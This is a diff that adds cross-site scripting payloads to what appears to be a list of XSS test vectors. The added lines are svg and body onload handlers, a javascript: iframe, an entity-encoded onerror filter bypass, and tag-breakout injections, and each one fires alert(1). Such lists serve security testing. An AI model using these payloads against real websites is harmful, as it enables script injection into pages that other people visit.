@@ -8,3 +8,11 @@
 <img src=1 onerror=confirm(1)>
 <b onclick=alert(1)>Click</b>
 <div onmouseover=alert(1)>Hover</div>
+
+
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<body onload=alert(1)>
+<img src=x o&#110;error=alert(1)>
+</div><svg onload=alert(1)>
+</td><img src=x onerror=alert(1)>
